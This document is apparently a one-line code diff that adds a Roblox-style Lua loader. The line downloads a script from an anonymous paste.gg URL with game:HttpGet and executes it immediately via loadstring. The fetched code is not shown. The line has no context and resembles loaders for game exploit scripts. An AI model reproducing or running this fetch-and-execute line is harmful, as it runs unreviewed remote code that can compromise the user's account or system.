@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://paste.gg/p/anonymous/6b7adf7a0e114491927802bda259439c/files/36011b37c6f842d3b3f2f1e2991ee1d9/raw', true))()
